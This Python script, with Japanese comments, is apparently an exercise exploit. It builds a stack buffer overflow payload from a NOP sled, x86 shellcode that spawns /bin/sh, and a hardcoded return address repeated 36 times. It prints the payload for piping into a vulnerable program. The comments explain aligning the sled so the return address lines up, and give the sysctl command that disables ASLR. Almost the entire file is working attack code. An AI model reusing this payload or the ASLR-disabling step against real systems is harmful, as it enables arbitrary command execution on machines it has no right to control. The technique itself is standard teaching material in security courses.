from pwn import *
import sys
import struct

def gen_payload_file(payload):
    f = open('payload2', 'wb')
    f.write(payload)
    f.close()

nop_sled = b'\x90' * 147

# 25byte
shellcode = b'\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80'

# 140 byte = 4(アドレス自体のバイトサイズ) * 35
# ここまでがリターンアドレスのオフセットで、この次4バイト(アドレス一つに相当)にアドレスが必要
return_addr = struct.pack('I', 0xffffd374) * 36

payload = nop_sled + shellcode + return_addr
sys.stdout.buffer.write(payload)
# gen_payload_file(payload)

# nop sled を4(バイト数)で割り切れるようにする必要がある。
# じゃないとリターンアドレスが4バイトに整列しないから、セグフォる。
# リターンアドレスは適宜変える

# ASLRをオフ
# sysctl -w kernel.randomize_va_space=0
